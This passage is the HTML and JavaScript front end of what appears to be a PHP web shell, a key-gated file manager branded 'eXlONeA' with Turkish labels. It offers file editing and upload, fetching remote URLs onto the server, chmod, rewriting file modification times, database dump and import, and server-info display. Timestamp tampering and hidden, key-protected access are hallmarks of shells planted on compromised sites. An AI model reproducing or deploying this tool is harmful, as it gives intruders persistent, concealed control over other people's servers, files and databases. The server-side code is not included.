        .code-preview { flex-grow: 1; padding: 10px; font-family: 'Courier New', monospace; font-size: 14px; line-height: 1.5; white-space: pre; word-wrap: normal; overflow: auto; background-color: transparent; position: absolute; top: 0; left: 50px; right: 0; bottom: 0; z-index: 1; pointer-events: none; }
        .code-preview pre { margin: 0; padding: 0; background: transparent !important; }
        .code-preview code { font-family: 'Courier New', monospace; font-size: 14px; line-height: 1.5; background: transparent !important; padding: 0 !important; }
        .theme-toggle-btn { font-size: 20px; padding: 8px 12px; border-radius: 5px; cursor: pointer; transition: all 0.3s ease; }
        .theme-toggle-btn:hover { transform: scale(1.1); }
        .edit-actions { display: flex; flex-wrap: wrap; gap: 10px; justify-content: flex-start; padding: 15px; border-top: 1px solid #dee2e6; }
        .dropdown-menu-fit-scroll { min-width: 250px; max-height: 300px; overflow-y: auto; overflow-x: hidden; }
        .breadcrumb-copy-btn { cursor: pointer; color: #007bff; margin-left: 10px; transition: color 0.2s; }
        .breadcrumb-copy-btn:hover { color: #0056b3; }
        .toast-container { position: fixed; top: 20px; right: 20px; z-index: 9999; }
        .hash-result { background: #f8f9fa; padding: 10px; border-radius: 5px; margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center; }
        .hash-result code { word-break: break-all; flex-grow: 1; }
        .hash-result button { margin-left: 10px; flex-shrink: 0; }
        .hash-results-container { max-height: 400px; overflow-y: auto; }
        .db-export-modal .modal-header, .modal-header.bg-primary { background-color: #007bff; color: white; }
        .db-export-modal .modal-title i, .modal-title i { margin-right: 10px; }
        .db-export-modal .modal-footer, .modal-footer { border-top: none; }
        .btn-close-white { filter: invert(1) grayscale(100%) brightness(200%); }
        .server-info-list .info-row { display: flex; align-items: center; gap: 10px; }
        .server-info-list .info-row i { font-size: 1.2rem; color: #007bff; }
        #previewModal img { max-width: 100%; max-height: 80vh; margin: auto; display: block; }
    </style>
</head>
<body>
    <div class="toast-container"></div>
    <div class="container mt-4">
        <div class="d-flex justify-content-between align-items-center mb-2">
            <h2><a href="?dir=<?php echo urlencode($baseDir); ?>&key=<?php echo $KEY_PARAM; ?>" style="text-decoration:none;color:inherit;">eXlONeA</a></h2>
            <div class="header-icons">
                <i class="bi bi-info-circle-fill" title="Sunucu Bilgileri" onclick="showServerInfo()"></i>
                <i class="bi bi-house-door-fill" title="Ana Dizin" onclick="window.location.href='?dir=<?php echo urlencode($baseDir); ?>&key=<?php echo $KEY_PARAM; ?>'"></i>
                <i class="bi bi-box-arrow-right text-danger" title="Çıkış Yap" onclick="window.location.href='?logout=true'"></i>
            </div>
        </div>
        <nav aria-label="breadcrumb">
            <ol class="breadcrumb">
                <?php foreach (getBreadcrumb($currentDir) as $crumb) { ?>
                    <li class="breadcrumb-item">
                        <a href="?dir=<?php echo urlencode($crumb['path']); ?>&key=<?php echo $KEY_PARAM; ?>"><?php echo htmlspecialchars($crumb['name']); ?></a>
                    </li>
                <?php } ?>
                <i class="bi bi-clipboard breadcrumb-copy-btn" title="Dizini Kopyala" onclick="copyCurrentPath('<?php echo htmlspecialchars($currentDir); ?>')"></i>
            </ol>
        </nav>
        <?php if ($error): ?>
            <div class="alert alert-danger alert-dismissible fade show" role="alert">
                <i class="bi bi-info-circle"></i> <?php echo $error; ?>
                <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
            </div>
        <?php endif; ?>
        <?php if ($success): ?>
            <div class="alert alert-success alert-dismissible fade show" role="alert">
                <i class="bi bi-info-circle"></i> <?php echo $success; ?>
                <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
            </div>
        <?php endif; ?>
        <div class="mb-3 button-group">
            <div class="dropdown">
                <button class="btn btn-custom dropdown-toggle" type="button" id="actionsMenu" data-bs-toggle="dropdown" aria-expanded="false"><i class="bi bi-list-stars"></i> İşlemler</button>
                <ul class="dropdown-menu dropdown-menu-fit-scroll" aria-labelledby="actionsMenu">
                    <li><a class="dropdown-item action-create-folder" href="#" data-bs-toggle="modal" data-bs-target="#createFolderModal"><i class="bi bi-folder-plus"></i> Yeni Klasör Oluştur</a></li>
                    <li><a class="dropdown-item action-create-file" href="#" data-bs-toggle="modal" data-bs-target="#createFileModal"><i class="bi bi-file-earmark-plus"></i> Yeni Dosya Oluştur</a></li>
                    <li><hr class="dropdown-divider"></li>
                    <li><a class="dropdown-item action-copy" href="#" data-bs-toggle="modal" data-bs-target="#copyModal" onclick="setTopluActionValues('copy')"><i class="bi bi-files"></i> Kopyala</a></li>
                    <li><a class="dropdown-item action-delete" href="#" onclick="performTopluAction('delete')"><i class="bi bi-trash"></i> Sil</a></li>
                    <li><a class="dropdown-item action-download" href="#" onclick="performTopluAction('download')"><i class="bi bi-download"></i> İndir</a></li>
                    <li><a class="dropdown-item action-download-zip" href="#" onclick="performTopluAction('download_zip')"><i class="bi bi-file-zip"></i> Seçilenleri Ziple İndir</a></li>
                    <li><a class="dropdown-item action-move" href="#" data-bs-toggle="modal" data-bs-target="#moveModal" onclick="setTopluActionValues('move')"><i class="bi bi-arrows-move"></i> Taşı</a></li>
                    <li><a class="dropdown-item action-rename" href="#" data-bs-toggle="modal" data-bs-target="#renameModal" onclick="setSingleActionValues('rename')"><i class="bi bi-pencil-square"></i> Yeniden Adlandır</a></li>
                    <li><a class="dropdown-item action-sunucuyaziple" href="#" onclick="performTopluAction('sunucuyaziple')"><i class="bi bi-file-earmark-zip"></i> SunucuyaZiple</a></li>
                    <li><a class="dropdown-item action-directzip" href="#" onclick="performTopluAction('directzip')"><i class="bi bi-file-zip"></i> DirektZiple İndir</a></li>
                    <li><a class="dropdown-item action-unzip" href="#" onclick="performTopluAction('unzip')"><i class="bi bi-file-zip-fill"></i> Zip'ten Çıkar</a></li>
                    <li><hr class="dropdown-divider"></li>
                    <li><a class="dropdown-item action-chmod" href="#" data-bs-toggle="modal" data-bs-target="#chmodModal" onclick="setSingleActionValues('chmod')"><i class="bi bi-shield-lock"></i> İzinleri Düzenle</a></li>
                    <li><a class="dropdown-item action-touch" href="#" data-bs-toggle="modal" data-bs-target="#touchModal" onclick="setSingleActionValues('touch')"><i class="bi bi-calendar-check"></i> Tarih/Saat Düzenle</a></li>
                </ul>
            </div>
            <div class="dropdown">
                <button class="btn btn-green dropdown-toggle" type="button" id="toolsMenu" data-bs-toggle="dropdown" aria-expanded="false"><i class="bi bi-tools"></i> Araçlar</button>
                <ul class="dropdown-menu dropdown-menu-fit-scroll" aria-labelledby="toolsMenu">
                    <li><button class="dropdown-item" type="button" data-bs-toggle="modal" data-bs-target="#uploadModal"><i class="bi bi-upload"></i> Yükle (Dosya/URL)</button></li>
                    <li><button class="dropdown-item" type="button" data-bs-toggle="modal" data-bs-target="#databaseExportModal"><i class="bi bi-database"></i> Veri Tabanı</button></li>
                    <li><button class="dropdown-item" type="button" data-bs-toggle="modal" data-bs-target="#encryptModal"><i class="bi bi-key"></i> Şifreleme</button></li>
                </ul>
            </div>
        </div>
        <form method="GET" action="" class="mb-3" id="searchForm">
            <div class="input-group">
                <input type="text" class="form-control" name="query" id="searchInput" placeholder="Dosya ara..." value="<?php echo isset($_GET['query']) ? htmlspecialchars($_GET['query']) : ''; ?>" oninput="performSearch()">
                <input type="hidden" name="dir" value="<?php echo htmlspecialchars($currentDir); ?>">
                <input type="hidden" name="key" value="<?php echo $KEY_PARAM; ?>">
                <input type="hidden" name="action" value="search">
                <button class="btn btn-primary" type="submit"><i class="bi bi-search"></i> Ara</button>
            </div>
        </form>
        <div class="table-responsive">
            <table class="table table-hover table-striped">
                <thead>
                    <tr>
                        <th><input type="checkbox" id="selectAll" onclick="toggleFileSelection()"></th>
                        <th>Ad</th>
                        <th>Boyut</th>
                        <th>Değiştirme Tarihi</th>
                        <th>İzinler</th>
                    </tr>
                </thead>
                <tbody>
                    <?php 
                    $parentDir = dirname($currentDir); 
                    if (realpath($parentDir) !== realpath($currentDir)) { 
                    ?>
                    <tr data-file-name=".." data-file-type="dir" data-perms="-" data-mtime="">
                        <td><input type="checkbox" name="file[]" value=".." onchange="updateFileSelection()"></td>
                        <td>
                            <i class="bi bi-folder-fill text-warning file-icon"></i>
                            <a href="?dir=<?php echo urlencode($parentDir); ?>&key=<?php echo $KEY_PARAM; ?>">..</a>
                        </td>
                        <td>-</td>
                        <td>-</td>
                        <td>-</td>
                    </tr>
                    <?php } ?>
                    <?php foreach ($files as $file) { 
                        $isSelf = $file['name'] === $scriptName;
                        $nameClass = $isSelf ? 'self-highlight' : '';
                        $fileUrl = getServerFileUrl($file['path']);
                        $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
                        $isImage = in_array($ext, ['jpg', 'jpeg', 'png', 'gif', 'webp']);
                    ?>
                    <tr data-file-name="<?php echo htmlspecialchars($file['name']); ?>" data-file-type="<?php echo $file['type']; ?>" data-perms="<?php echo $file['perms']; ?>" data-mtime="<?php echo $file['mtime'] ? date('Y-m-d H:i:s', $file['mtime']) : ''; ?>" data-file-url="<?php echo htmlspecialchars($fileUrl); ?>">
                        <td><input type="checkbox" name="file[]" value="<?php echo htmlspecialchars($file['name']); ?>" onchange="updateFileSelection()"></td>
                        <td>
                            <i class="<?php echo $file['icon']; ?> file-icon"></i>
                            <?php if ($file['type'] === 'dir') { ?>
                                <a href="?dir=<?php echo urlencode($file['path']); ?>&key=<?php echo $KEY_PARAM; ?>" class="<?php echo $nameClass; ?>"><?php echo htmlspecialchars($file['name']); ?></a>
                            <?php } elseif ($isImage) { ?>
                                <a href="#" onclick="previewImage('<?php echo htmlspecialchars($fileUrl); ?>'); return false;" class="<?php echo $nameClass; ?>"><?php echo htmlspecialchars($file['name']); ?></a>
                            <?php } else { ?>
                                <a href="#" onclick="openEditModal('<?php echo htmlspecialchars($file['name'], ENT_QUOTES); ?>'); return false;" class="<?php echo $nameClass; ?>"><?php echo htmlspecialchars($file['name']); ?></a>
                            <?php } ?>
                        </td>
                        <td><?php echo formatSize($file['size']); ?></td>
                        <td><?php echo date('Y-m-d H:i', $file['mtime']); ?></td>
                        <td><?php echo $file['perms']; ?></td>
                    </tr>
                    <?php } 
                    if (empty($files)) {
                        echo '<tr><td colspan="5" class="text-center">Dosya bulunamadı</td></tr>';
                    }
                    ?>
                </tbody>
            </table>
        </div>
        <div class="footer">Copyright © Exlonea - 2025</div>
        <div class="modal fade" id="editModal" tabindex="-1" aria-labelledby="editModalLabel" aria-hidden="true">
            <div class="modal-dialog modal-xl">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title" id="editModalLabel"><i class="bi bi-code-square"></i> Düzenle: <span id="modalFileName" class="text-primary"></span></h5>
                        <div class="d-flex align-items-center ms-3 gap-2">
                            <button type="button" class="btn btn-sm btn-outline-info" onclick="editor.setValue('');" title="Temizle"><i class="bi bi-eraser"></i></button>
                            <button type="button" class="btn btn-sm btn-outline-info" onclick="editor.setTheme('ace/theme/chrome');" title="Light"><i class="bi bi-sun"></i></button>
                            <button type="button" class="btn btn-sm btn-outline-info" onclick="editor.setTheme('ace/theme/monokai');" title="Dark"><i class="bi bi-moon"></i></button>
                            <a id="headerFileUrl" href="#" target="_blank" class="btn btn-sm btn-outline-info" title="URL'ye Git"><i class="bi bi-link-45deg"></i></a>
                        </div>
                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Kapat"></button>
                    </div>
                    <form method="POST" id="editForm" action="?action=edit&dir=<?php echo urlencode($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>">
                        <input type="hidden" name="action" value="edit">
                        <input type="hidden" name="file" id="editFileName">
                        <div class="modal-body">
                            <div style="display:none;">
                                <span id="filePermsDisplay" class="fw-bold"></span>
                                <span id="fileMTimeDisplay" class="fw-bold"></span>
                                <a id="fileUrlDisplay"></a>
                            </div>
                            <div id="editor"></div>
                            <textarea name="content" id="fileContent" style="display: none;"></textarea>
                        </div>
                        <div class="modal-footer">
                            <button type="button" class="btn btn-danger" data-bs-dismiss="modal"><i class="bi bi-x-lg"></i> İptal</button>
                            <button type="submit" class="btn btn-success"><i class="bi bi-save"></i> Kaydet</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        <div class="modal fade" id="previewModal" tabindex="-1" aria-hidden="true">
            <div class="modal-dialog modal-lg">
                <div class="modal-content bg-dark">
                    <div class="modal-body text-center p-0">
                        <img id="previewImage" src="" alt="Önizleme">
                    </div>
                    <div class="modal-footer border-0">
                        <button type="button" class="btn btn-secondary btn-sm" data-bs-dismiss="modal">Kapat</button>
                    </div>
                </div>
            </div>
        </div>
        <div class="modal fade" id="createFolderModal" tabindex="-1" aria-labelledby="createFolderModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header bg-primary text-white">
                        <h5 class="modal-title" id="createFolderModalLabel"><i class="bi bi-folder-plus"></i> Yeni Klasör Oluştur</h5>
                        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Kapat"></button>
                    </div>
                    <form method="POST" action="?action=create_folder&dir=<?php echo urlencode($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>">
                        <div class="modal-body"><input type="text" name="folder_name" class="form-control" placeholder="Klasör Adı" required></div>
                        <div class="modal-footer">
                            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal"><i class="bi bi-x-circle"></i> İptal</button>
                            <button type="submit" class="btn btn-primary"><i class="bi bi-check-circle"></i> Oluştur</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        <div class="modal fade" id="createFileModal" tabindex="-1" aria-labelledby="createFileModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header bg-primary text-white">
                        <h5 class="modal-title" id="createFileModalLabel"><i class="bi bi-file-earmark-plus"></i> Yeni Dosya Oluştur</h5>
                        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Kapat"></button>
                    </div>
                    <form method="POST" action="?action=create_file&dir=<?php echo urlencode($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>">
                        <div class="modal-body"><input type="text" name="file_name" class="form-control" placeholder="Dosya Adı (Örn: index.php)" required></div>
                        <div class="modal-footer">
                            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal"><i class="bi bi-x-circle"></i> İptal</button>
                            <button type="submit" class="btn btn-primary"><i class="bi bi-check-circle"></i> Oluştur & Düzenle</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        <div class="modal fade" id="renameModal" tabindex="-1" aria-labelledby="renameModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header bg-primary text-white">
                        <h5 class="modal-title" id="renameModalLabel"><i class="bi bi-pencil-square"></i> Yeniden Adlandır</h5>
                        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Kapat"></button>
                    </div>
                    <form method="POST" action="?action=rename&dir=<?php echo urlencode($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>" id="renameForm">
                        <div class="modal-body">
                            <input type="hidden" name="old_name" id="renameOldName">
                            <p>Eski Ad: <span id="renameOldNameDisplay" class="fw-bold"></span></p>
                            <label for="renameNewName" class="form-label">Yeni Ad</label>
                            <input type="text" name="new_name" id="renameNewName" class="form-control" required>
                        </div>
                        <div class="modal-footer">
                            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal"><i class="bi bi-x-circle"></i> İptal</button>
                            <button type="submit" class="btn btn-primary"><i class="bi bi-check-circle"></i> Adlandır</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        <div class="modal fade" id="chmodModal" tabindex="-1" aria-labelledby="chmodModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header bg-primary text-white">
                        <h5 class="modal-title" id="chmodModalLabel"><i class="bi bi-shield-lock"></i> İzinleri Düzenle (CHMOD)</h5>
                        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Kapat"></button>
                    </div>
                    <form method="POST" action="?action=chmod&dir=<?php echo urlencode($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>" id="chmodForm">
                        <div class="modal-body">
                            <input type="hidden" name="file" id="chmodFileName">
                            <p>Dosya: <span id="chmodFileNameDisplay" class="fw-bold"></span></p>
                            <p>Mevcut İzin: <span id="chmodOldPerms" class="fw-bold"></span></p>
                            <label for="chmodNewPerms" class="form-label">Yeni İzin (Oktal - Örn: 0777, 0644)</label>
                            <input type="text" name="perms" id="chmodNewPerms" class="form-control" pattern="0[0-7]{3}" maxlength="4" required>
                        </div>
                        <div class="modal-footer">
                            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal"><i class="bi bi-x-circle"></i> İptal</button>
                            <button type="submit" class="btn btn-primary"><i class="bi bi-check-circle"></i> Uygula</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        <div class="modal fade" id="touchModal" tabindex="-1" aria-labelledby="touchModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header bg-primary text-white">
                        <h5 class="modal-title" id="touchModalLabel"><i class="bi bi-calendar-check"></i> Tarih/Saat Düzenle</h5>
                        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Kapat"></button>
                    </div>
                    <form method="POST" action="?action=touch&dir=<?php echo urlencode($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>" id="touchForm">
                        <div class="modal-body">
                            <input type="hidden" name="file" id="touchFileName">
                            <p>Dosya: <span id="touchFileNameDisplay" class="fw-bold"></span></p>
                            <p>Mevcut Tarih/Saat: <span id="touchOldMtime" class="fw-bold"></span></p>
                            <label for="touchNewMtime" class="form-label">Yeni Tarih/Saat</label>
                            <input type="datetime-local" name="mtime" id="touchNewMtime" class="form-control" step="1" required>
                        </div>
                        <div class="modal-footer">
                            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal"><i class="bi bi-x-circle"></i> İptal</button>
                            <button type="submit" class="btn btn-primary"><i class="bi bi-check-circle"></i> Uygula</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        <div class="modal fade" id="uploadModal" tabindex="-1" aria-labelledby="uploadModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header bg-primary text-white">
                        <h5 class="modal-title" id="uploadModalLabel"><i class="bi bi-upload"></i> Dosya Yükle / URL'den İndir</h5>
                        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Kapat"></button>
                    </div>
                    <div class="modal-body">
                        <div class="mb-3">
                            <div class="form-check form-switch">
                                <input class="form-check-input" type="checkbox" id="createFolderToggle" onchange="toggleFolderCreation()">
                                <label class="form-check-label" for="createFolderToggle">Klasör Oluştur ve İçine Yükle</label>
                            </div>
                            <div id="folderNameInput" style="display:none;" class="mt-2">
                                <input type="text" class="form-control" id="uploadFolderName" placeholder="Klasör Adı">
                            </div>
                        </div>
                        <ul class="nav nav-tabs" id="uploadTab" role="tablist">
                            <li class="nav-item" role="presentation"><button class="nav-link active" id="file-tab" data-bs-toggle="tab" data-bs-target="#file-upload" type="button" role="tab"><i class="bi bi-file-earmark-arrow-up"></i> Dosya Yükle</button></li>
                            <li class="nav-item" role="presentation"><button class="nav-link" id="url-tab" data-bs-toggle="tab" data-bs-target="#url-download" type="button" role="tab"><i class="bi bi-link-45deg"></i> URL'den İndir</button></li>
                        </ul>
                        <div class="tab-content pt-3">
                            <div class="tab-pane fade show active" id="file-upload" role="tabpanel">
                                <form method="POST" action="?action=upload&dir=<?php echo urlencode($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>" enctype="multipart/form-data" id="fileUploadForm">
                                    <input type="hidden" name="upload_type" value="file">
                                    <input type="hidden" name="create_folder_on_upload" id="fileUploadFolderFlag" value="no">
                                    <input type="hidden" name="upload_folder_name" id="fileUploadFolderName" value="">
                                    <div class="mb-3">
                                        <label for="uploadedFiles" class="form-label">Dosya(ları) Seçin</label>
                                        <input class="form-control" type="file" id="uploadedFiles" name="uploaded_files[]" multiple required>
                                    </div>
                                    <button type="submit" class="btn btn-primary w-100"><i class="bi bi-upload"></i> Yükle</button>
                                </form>
                            </div>
                            <div class="tab-pane fade" id="url-download" role="tabpanel">
                                <form method="POST" action="?action=upload&dir=<?php echo urlencode($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>" id="urlUploadForm">
                                    <input type="hidden" name="upload_type" value="url">
                                    <input type="hidden" name="create_folder_on_upload" id="urlUploadFolderFlag" value="no">
                                    <input type="hidden" name="upload_folder_name" id="urlUploadFolderName" value="">
                                    <div class="mb-3">
                                        <label for="urls" class="form-label">URL'leri Girin (Her satıra bir tane)</label>
                                        <textarea class="form-control" id="urls" name="urls" rows="5" placeholder="https://example.com/dosya.zip&#10;https://another.com/image.jpg" required></textarea>
                                    </div>
                                    <button type="submit" class="btn btn-primary w-100"><i class="bi bi-download"></i> İndir</button>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="modal fade" id="moveModal" tabindex="-1" aria-labelledby="moveModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header bg-primary text-white">
                        <h5 class="modal-title" id="moveModalLabel"><i class="bi bi-arrows-move"></i> Dosyaları/Klasörleri Taşı</h5>
                        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Kapat"></button>
                    </div>
                    <form method="POST" action="?action=move&dir=<?php echo urlencode($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>" id="moveForm">
                        <div class="modal-body">
                            <p>Seçilen Öğe Sayısı: <span id="moveFileCount" class="fw-bold">0</span></p>
                            <input type="hidden" name="files[]" id="moveFileNames">
                            <label for="moveDestination" class="form-label">Hedef Dizin</label>
                            <input type="text" name="destination" id="moveDestination" class="form-control" placeholder="/var/www/html/yeni_dizin" required>
                        </div>
                        <div class="modal-footer">
                            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal"><i class="bi bi-x-circle"></i> İptal</button>
                            <button type="submit" class="btn btn-primary"><i class="bi bi-check-circle"></i> Taşı</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        <div class="modal fade" id="copyModal" tabindex="-1" aria-labelledby="copyModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header bg-primary text-white">
                        <h5 class="modal-title" id="copyModalLabel"><i class="bi bi-files"></i> Dosyaları/Klasörleri Kopyala</h5>
                        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Kapat"></button>
                    </div>
                    <form method="POST" action="?action=copy&dir=<?php echo urlencode($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>" id="copyForm">
                        <div class="modal-body">
                            <p>Seçilen Öğe Sayısı: <span id="copyFileCount" class="fw-bold">0</span></p>
                            <input type="hidden" name="files[]" id="copyFileNames">
                            <label for="copyDestination" class="form-label">Hedef Dizin</label>
                            <input type="text" name="destination" id="copyDestination" class="form-control" placeholder="/var/www/html/yedek_dizin" required>
                        </div>
                        <div class="modal-footer">
                            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal"><i class="bi bi-x-circle"></i> İptal</button>
                            <button type="submit" class="btn btn-primary"><i class="bi bi-check-circle"></i> Kopyala</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        <div class="modal fade db-export-modal" id="databaseExportModal" tabindex="-1" aria-labelledby="databaseExportModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header bg-primary text-white">
                        <h5 class="modal-title" id="databaseExportModalLabel"><i class="bi bi-database"></i> Veri Tabanı Araçları</h5>
                        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Kapat"></button>
                    </div>
                    <div class="modal-body">
                        <ul class="nav nav-tabs mb-3" id="dbTab" role="tablist">
                            <li class="nav-item"><button class="nav-link active" id="export-tab" data-bs-toggle="tab" data-bs-target="#db-export" type="button">Dışa Aktar (Export)</button></li>
                            <li class="nav-item"><button class="nav-link" id="import-tab" data-bs-toggle="tab" data-bs-target="#db-import" type="button">İçe Aktar (Import)</button></li>
                        </ul>
                        <div class="tab-content">
                            <div class="tab-pane fade show active" id="db-export">
                                <form method="POST" action="?action=database_export&dir=<?php echo urlencode($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>">
                                    <div class="mb-2"><input type="text" name="host" class="form-control" value="localhost" placeholder="Host" required></div>
                                    <div class="mb-2"><input type="text" name="user" class="form-control" placeholder="Kullanıcı Adı" required></div>
                                    <div class="mb-2"><input type="text" name="pass" class="form-control" placeholder="Şifre" value=""></div>
                                    <div class="mb-3"><input type="text" name="db" class="form-control" placeholder="Veritabanı Adı" required></div>
                                    <button type="submit" class="btn btn-primary w-100"><i class="bi bi-download"></i> İndir (.sql)</button>
                                </form>
                            </div>
                            <div class="tab-pane fade" id="db-import">
                                <form method="POST" action="?action=database_import&dir=<?php echo urlencode($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>" enctype="multipart/form-data">
                                    <div class="mb-2"><input type="text" name="host" class="form-control" value="localhost" placeholder="Host" required></div>
                                    <div class="mb-2"><input type="text" name="user" class="form-control" placeholder="Kullanıcı Adı" required></div>
                                    <div class="mb-2"><input type="text" name="pass" class="form-control" placeholder="Şifre" value=""></div>
                                    <div class="mb-3"><input type="text" name="db" class="form-control" placeholder="Veritabanı Adı" required></div>
                                    <div class="mb-3"><label class="form-label">SQL Dosyası</label><input type="file" name="sql_file" class="form-control" required></div>
                                    <button type="submit" class="btn btn-danger w-100"><i class="bi bi-upload"></i> İçe Aktar</button>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="modal fade" id="encryptModal" tabindex="-1" aria-labelledby="encryptModalLabel" aria-hidden="true">
            <div class="modal-dialog modal-lg">
                <div class="modal-content">
                    <div class="modal-header bg-primary text-white">
                        <h5 class="modal-title" id="encryptModalLabel"><i class="bi bi-key"></i> Şifreleme Araçları</h5>
                        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Kapat"></button>
                    </div>
                    <div class="modal-body">
                        <div class="mb-3">
                            <label for="encryptInput" class="form-label">Şifrelenecek Metin</label>
                            <input type="text" class="form-control" id="encryptInput" placeholder="Örn: 123">
                        </div>
                        <hr>
                        <div class="hash-results-container" id="hashResults"></div>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-primary" onclick="generateHashes()"><i class="bi bi-gear-fill"></i> Şifrele</button>
                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal"><i class="bi bi-x-circle"></i> Kapat</button>
                    </div>
                </div>
            </div>
        </div>
        <div class="modal fade" id="serverInfoModal" tabindex="-1" aria-labelledby="serverInfoModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title" id="serverInfoModalLabel"><i class="bi bi-info-circle"></i> Sunucu Bilgileri</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Kapat"></button>
                    </div>
                    <div class="modal-body" id="serverInfoContent"></div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal"><i class="bi bi-x-circle"></i> Kapat</button>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/php.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/javascript.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/css.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/xml.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/sql.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/python.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/json.min.js"></script>
    <script>
        let selectedFiles = [];
        let searchTimeout = null;
        let editor;
        function getAceMode(fileName) {
            const ext = fileName.split('.').pop().toLowerCase();
            const modes = {
                'php': 'php', 'html': 'html', 'htm': 'html', 'css': 'css', 'js': 'javascript', 
                'json': 'json', 'xml': 'xml', 'txt': 'text', 'sql': 'sql', 'py': 'python',
                'rb': 'ruby', 'java': 'java', 'c': 'c_cpp', 'cpp': 'c_cpp', 'md': 'markdown',
                'htaccess': 'apache_conf'
            };
            return "ace/mode/" + (modes[ext] || 'text');
        }
        function openEditModal(fileName) {
            const editModalEl = document.getElementById('editModal');
            const editModal = bootstrap.Modal.getInstance(editModalEl) || new bootstrap.Modal(editModalEl);
            document.getElementById('modalFileName').textContent = fileName;
            document.getElementById('editFileName').value = fileName;
            const row = document.querySelector(`tr[data-file-name="${fileName}"]`);
            if (row) {
                const fileType = row.getAttribute('data-file-type');
                if (fileType === 'dir') {
                    alert("Dizinler düzenlenemez!");
                    return;
                }
            }
            if (!editor) {
                editor = ace.edit("editor");
                editor.setTheme("ace/theme/monokai");
                editor.setFontSize(14);
                editor.setShowPrintMargin(false);
                editor.commands.addCommand({
                    name: 'saveFile',
                    bindKey: {win: 'Ctrl-S', mac: 'Command-S'},
                    exec: function(editor) {
                        document.getElementById('editForm').querySelector('button[type="submit"]').click();
                    }
                });
            }
            editor.setValue('Yükleniyor...');
            editor.getSession().setMode(getAceMode(fileName));
